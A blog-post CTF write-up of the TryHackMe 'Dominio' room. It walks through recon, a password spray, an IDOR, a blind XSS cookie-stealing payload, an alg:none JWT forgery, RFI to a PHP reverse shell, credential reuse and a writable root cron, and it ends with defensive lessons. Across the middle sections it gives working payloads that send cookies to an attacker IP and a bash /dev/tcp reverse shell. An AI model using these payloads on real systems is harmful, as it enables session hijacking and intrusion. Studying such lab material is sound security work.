---
title: 'TryHackMe Dominio — from team.php to root'
description: 'Dominio writeup: recon with feroxbuster, password spraying, IDOR, blind XSS to hijack the admin session, a JWT alg:none bypass, RFI, and a group-writable root cron.'
date: 2026-10-22T19:29:00Z
lang: en
tags: [tryhackme, writeup, web, privesc, ctf]
draft: false
---

> Writeup of the **Dominio** room (TryHackMe): web recon, blind XSS, a JWT `alg:none` bypass, RFI,
> and a group-writable cron — all the way to root. _[Leia em português](/posts/thm-dominio/)._

This is a chaining box: each vulnerability, on its own, is small; the damage lives in the sum. Flags
appear **redacted** (`REDACTED`) — what matters here is the chain, not the string you paste into the
site.

The whole chain, in one sentence: enumerate the app → knock down weak passwords with a spray → grab
the first flag with an **IDOR** → use a **blind XSS** to steal the administrator's cookie → forge a
**JWT with `alg:none`** to abuse a file-reading API → turn that into **RCE** via RFI → reuse a
credential to move sideways → and escalate to root through a **group-writable cron**.

## Recon: drawing the app before touching it

First map of the target, no rush. `/etc/hosts` pointing `dominio.thm`, and a
[feroxbuster](https://github.com/epi052/feroxbuster) with SecLists' `common.txt`:

```console
$ feroxbuster -w ~/Sec/Tools/Wordlists/SecLists/Discovery/Web-Content/common.txt -u 'http://dominio.thm/'
200      GET       28l       62w      861c http://dominio.thm/index.php
200      GET       96l      307w     3747c http://dominio.thm/team.php
301      GET        9l       28w      310c http://dominio.thm/admin => http://dominio.thm/admin/
301      GET        9l       28w      308c http://dominio.thm/api => http://dominio.thm/api/
301      GET        9l       28w      311c http://dominio.thm/backup => http://dominio.thm/backup/
200      GET        1l        2w      194c http://dominio.thm/backup/config.enc
200      GET        4l       17w      191c http://dominio.thm/backup/README.txt
302      GET        0l        0w        0c http://dominio.thm/api/auth/token.php => .../index.php
403      GET        8l       29w      322c http://dominio.thm/admin/index.php
301      GET        9l       28w      312c http://dominio.thm/support => http://dominio.thm/support/
```

That already tells a story: there's a **login** (`index.php`), an employee showcase (`team.php`), an
`/admin/` that returns **403** (it exists, just not for me yet), an **API** that issues a token
(`/api/auth/token.php`), a `/support/`, and a `/backup/` with open directory listing serving a
`config.enc` and a `README.txt`.

The backup's `README.txt` is a little too honest:

```text
NexusCorp Backup Configuration
================================
config.enc  - Encrypted application configuration (AES-128-ECB)
Decryption key reference: see static/app.js (deployment notes)
```

And `static/app.js` hands over the key in a comment — the classic "secret in the front-end":

```js
// Encryption key for backup config decryption - AES-ECB-128
// Key: N3xusK3y2024!!  (pad to 16 bytes with  )
_backupKey: 'N3xusK3y2024!!',
```

I wrote a tiny decryptor (AES-128-ECB, 14-char key + 2 bytes of padding) just to confirm what was
inside:

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# 14 ASCII chars + 2 padding bytes = 16. The JS comment showed an unrendered
# byte (U+FFFD); a null byte is the usual padding culprit.
KEY = b"N3xusK3y2024!!" + b"\x00" * 2

def decrypt(path):
    data = path.read_bytes()
    plain = AES.new(KEY, AES.MODE_ECB).decrypt(data)
    try:                                   # try PKCS7 first
        return unpad(plain, AES.block_size)
    except ValueError:                     # otherwise strip trailing null bytes
        return plain.rstrip(b"\x00")
```

```console
$ python decrypt-config.py config.enc
{"app_name":"NexusCorp Portal","version":"2.3.1","deploy_env":"production","system_user":"devops"}
```

Honestly? Almost a dead end. The `config.enc` only confirms the `devops` user exists — worth
keeping in the back of my head, nothing that grants access now. But it's the kind of detail that pays
interest later.

## User enumeration: the showcase hands over the payroll

`team.php` is an "our team" page — and, to an attacker, a user list with role and email thrown in.

![team.php page listing NexusCorp's seven employees with name, role and email](./img/team.png)

The email pattern (`first.last@nexus.corp`) becomes a username pattern with no effort:

```text
laura.hayes      # Chief Information Officer  → likely admin
michael.chen     # Lead Security Engineer
sarah.johnson    # Senior Software Engineer
robert.wilson    # DevOps Engineer
emma.taylor      # Product Manager
david.brown      # Full Stack Developer
james.wright     # Systems Administrator
```

I saved that into `possible_users.txt`. Noticing Laura is CIO already plants a goal: if I ever need
"admin", it's her session I want.

## Password spraying: let hydra do the boring part

With seven valid users, a spray with SecLists' 10k most-common-passwords list against
`POST /index.php`:

```console
$ hydra -L possible_users.txt \
    -P ~/Sec/Tools/Wordlists/SecLists/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt \
    dominio.thm http-post-form '/index.php:username=^USER^&password=^PASS^:Invalid credentials.' -I
[80][http-post-form] host: dominio.thm   login: sarah.johnson   password: password
[80][http-post-form] host: dominio.thm   login: robert.wilson   password: password
[80][http-post-form] host: dominio.thm   login: emma.taylor     password: password
1 of 1 target successfully completed, 7 valid passwords found
```

Three accounts with the password `password`. (Hydra lists all seven logins because the error message
changes when the user exists — free enumeration — but only three have a crackable password.) I log
in as `sarah.johnson`. I'm a plain user, and the portal makes that very clear.

## Inside the portal: a strange session model

![Portal dashboard logged in as sarah.johnson, showing Role: user and the "My Profile", "File Viewer" and "Quick Links" cards](./img/dashboard.png)

The dashboard has a **File Viewer** card pointing at the real web target:
`GET /api/files.php?name=` with **JWT** auth via `/api/auth/token.php`. `app.js` explains the flow:
there's a `nexus_session` cookie (a base64 JSON with `user_id`, `username` and `role`, plus an HMAC
signature) and, in parallel, a JWT stashed in `localStorage`. Two endpoints of that API stand out:
the **File Viewer** (`files.php`) and the **My Profile API** (`profile.php`), which the dashboard
links as `?id=<my id>`.

## Horizontal IDOR: reading the admin's profile

`profile.php` takes the `id` from the query and returns the matching profile — but never checks
whether that `id` is **mine**. Textbook horizontal IDOR. Logged in as `sarah` (who is `id=3`), I swap
the number for `id=1`:

```console
$ curl -s -b cookies 'http://dominio.thm/api/users/profile.php?id=1'
{"id":1,"username":"laura.hayes","email":"laura.hayes@nexus.corp","role":"admin",
 "notes":"THM{REDACTED  ·  idor}"}
```

The `fl4g1` was in the admin's **profile notes** (redacted). And as a bonus, confirmation of what
`team.php` only hinted at: `laura.hayes` is `id=1` and `role=admin`. No more guessing — I know exactly
which session is worth stealing.

## The files.php wall: admin JWT only

Testing the API with the token `token.php` itself hands me:

```console
$ curl -s -H "Authorization: Bearer $TOKEN" 'http://dominio.thm/api/files.php?name=test'
{"error":"Admin JWT required. Check your token payload."}
```

The detail that jams everything: `token.php` hands me a JWT with `"role":"user"` — fair enough, I'm a
plain user. But `files.php` requires `"role":"admin"` in the payload. So: I need an admin token the
server refuses to issue me. Two obvious ways out — steal a real admin session, or forge the token. In
the end I used **both**, one to unlock the other.

## Blind XSS: letting the admin bot log in for me

`/support/` lets you open tickets. A free-text field that someone "reviews" is practically an
invitation to **stored XSS** — and the name of this step's flag confirmed the technique afterwards.

![The "Open Support Ticket" form with Subject and Message fields](./img/new-ticket.png)

The idea of blind XSS: I don't see the result in my browser; my payload is rendered by a **bot** on
the other side, authenticated. If that bot is Laura (or runs with her session), the payload executes
in her context and I exfiltrate the cookie. Payload in the ticket body:

```html
<img src="x" onerror="new Image().src='http://192.168.159.13/c='+document.cookie" />
```

On my side, no heavy tooling: a Python HTTP server that just logs everything that comes in — method,
path, headers and body — and answers `200 OK` to any method:

```python
from http.server import BaseHTTPRequestHandler, HTTPServer


class Handler(BaseHTTPRequestHandler):
    def _log(self):
        print(f"\n--- {self.command} {self.path} ---")

        print("Headers:")
        for key, value in self.headers.items():
            print(f"  {key}: {value}")

        length = int(self.headers.get("Content-Length", 0))
        if length:
            body = self.rfile.read(length)
            print(f"Body ({length} bytes):")
            print(body.decode("utf-8", errors="replace"))

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK\n")

    do_GET = do_POST = do_PUT = do_DELETE = do_PATCH = do_HEAD = _log


if __name__ == "__main__":
    port = 80
    print(f"Listening on http://localhost:{port}")
    HTTPServer(("0.0.0.0", port), Handler).serve_forever()
```

I open the ticket, wait for the bot to "review" it, and the callback lands:

```console
$ sudo python main.py
Listening on http://localhost:80

--- GET /c= ---
Headers:
  Host: 192.168.159.13
  User-Agent: python-requests/2.31.0
  Cookie: nexus_session=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImxhdXJhLmhheWVzIiwgInJvbGUiOiAiYWRtaW4ifQ==...
10.64.163.38 - - [22/Oct/2026 15:53:49] "GET /c= HTTP/1.1" 200 -
```

A session landed on the plate. The value is a delight to decode: that `eyJ...` before the dot is just
base64, and opening it shows whose it is:
`{"user_id": 1, "username": "laura.hayes", "role": "admin"}`. It's Laura's session — the same
`user_id` 1 I'd already flagged in the IDOR. The session is a signed trust object — but I don't need to forge it, I **stole the original**. I swap my cookie for
hers and the `/admin/` that gave me a 403 now opens.

![Admin panel logged in as laura.hayes, with the flag redacted](./img/admin-panel.png)

The second flag (`fl4g2`), **redacted** above in the "System Status" card. The panel even kindly
documents the File Viewer endpoint: `GET /api/files.php?name=[path] with Bearer token`.

## alg:none: the oldest JWT bypass in the book

This is the step I enjoy most. With Laura's session I could already browse the admin panel, but
`files.php` kept demanding a **JWT** with `role:admin` — and here's the surprise: `token.php`, even
with her session, still hands me `role:user`. The "clean" path would be to recover the `JWT_SECRET`
and sign a fresh token. I didn't
have the secret (it lives in `config.php`, which I can only read _after_ abusing `files.php` — a
perfect chicken-and-egg).

The way out was dumber and prettier: the classic **`none` algorithm** attack. If the server's
verification trusts the token header's own `alg` field, I swap `HS256` for `none`, drop the
signature and declare `"role":"admin"` freely. I built the token (with
[jwthunter.io](https://jwthunter.io/) as a helper to visualize the fields) and fired:

```console
$ curl -s -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYXVyYS5oYXllcyIsInJvbGUiOiJhZG1pbiJ9." \
    'http://dominio.thm/api/files.php' --data-urlencode 'name=../config.php' -G
{"file":"/var/www/html/config.php","content":"<?php
define('DB_PASS', 'D3v0ps!2024');
define('JWT_SECRET', 'nexus_jwt_s3cr3t_2024');
define('APP_SECRET', 'nexus_app_k3y_2024');
..."}
```

Empty signature, `alg:none`, and the server swallowed it. Two ironies: (1) now I have the
`JWT_SECRET` I'd have needed for the "correct" path — too late to care; (2) I have `DB_PASS` =
`D3v0ps!2024`, which will be worth gold in the next step.

`files.php`'s `name=` has a naive path check ("must stay inside `/var/www/html/`") that I beat with
`../config.php` but which blocks `../../../../etc/passwd`. Except it also accepts a **remote URL** —
RFI:

```console
$ curl ... --data-urlencode 'name=http://192.168.159.13/x' -G
{"error":"Could not fetch remote file"}
```

"Could not fetch" means it _tried_ to fetch. Just serve a malicious PHP. I stand up
[php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell) pointing at me on 4445,
include it via RFI, and catch the shell. Instead of the usual `nc`, I used
[penelope](https://github.com/brightio/penelope) as the handler — decent PTY and a session log for
free:

```console
$ penelope -p 4445
[+] Shell => www-data@tryhackme-2404
www-data@tryhackme-2404:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@tryhackme-2404:/$ cat /opt/flag3.txt
THM{REDACTED  ·  foothold}
```

Foothold. RFI→RCE flag in the pocket (**redacted**).

## Lateral movement: the credential config.php handed me

`www-data` is a guest, not the owner of the house. `config.php` had already given me `D3v0ps!2024`,
and `team.php` had already told me there's a `robert.wilson` DevOps and a system user `devops`.
Password reuse is the cardinal sin that never goes out of style:

```console
www-data@tryhackme-2404:/$ su devops
Password: D3v0ps!2024
devops@tryhackme-2404:~$ cat user.txt
THM{REDACTED  ·  lateral}
```

In. This step's flag is literally named "credential reuse for lateral movement" — sometimes the room
author is just yelling the lesson in your face.

## Privesc: a root cron and a group with too much permission

As `devops`, the usual question: what runs as root and lets me lean on it? I pulled
[pspy](https://github.com/DominicBreuker/pspy) to watch processes without needing privilege:

```console
devops@tryhackme-2404:~$ wget http://192.168.159.13/pspy64 && chmod +x pspy64 && ./pspy64
...
CMD: UID=0  PID=1107  | /usr/bin/python3 /opt/admin_bot.py
CMD: UID=0  PID=606   | /usr/sbin/cron -f -P
```

A root `cron` running. Following the scent to `/opt/monitoring/`:

```console
devops@tryhackme-2404:/opt/monitoring$ ls -l
-rwxrwxr-- 1 root devops 537 May 18 10:41 health_report.sh
```

There it is. The script is **owned by root**, but the group is `devops` and has the write bit
(`rwxrwxr--`). I _am_ in the `devops` group. A root cron that executes a file I can rewrite is game
over — just plant a reverse shell inside it and wait for the clock:

```bash
# health_report.sh, now with a gift at the end
bash -i >& /dev/tcp/192.168.159.13/9001 0>&1
```

On the other side, a simple listener (this time plain `nc`, since it's just catching a root shell and
leaving):

```console
$ nc -lvnp 9001
...
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
THM{REDACTED  ·  root}
```

Root. Five flags, the whole box.

## What's left

None of these vulnerabilities is exotic. What the room teaches well is **chaining**: each link is
small, almost forgivable in isolation, and the damage lives in the sum.

- **Secret in the front-end.** The `config.enc` key in a JS comment. If it's in the client's browser,
  it's not a secret.
- **Weak passwords + enumeration.** `password` on three accounts, and a login error that gives away
  who exists. Spraying still pays the bills.
- **Horizontal IDOR.** `profile.php` trusts the `id` in the query without checking the session — any
  user reads any other user's profile (and notes).
- **Blind XSS → session hijack.** An unsanitized ticket field and an authenticated bot. I didn't
  forge Laura's trust; I stole her whole session.
- **`alg:none`.** The oldest JWT bug in the book, and still alive. Verify the signature _and_ pin the
  algorithm server-side — never trust the token's `alg`.
- **Naive path check + RFI.** A filter that thinks about `../` but forgets `http://`.
- **Credential reuse.** The `DB_PASS` became the system user's password.
- **Group permission + root cron.** `rwxrwxr--` on a file root executes is, in practice, a disguised
  SUID.

The part I enjoy most, looking back, is the `alg:none`. The obvious path would be to recover the
`JWT_SECRET` some other way; I simply refused to prove I knew the secret, and the server went along
with it. It's a good reminder that, in security, the right question is often not "how do I get the
key?" but "does it even check whether I have one?".
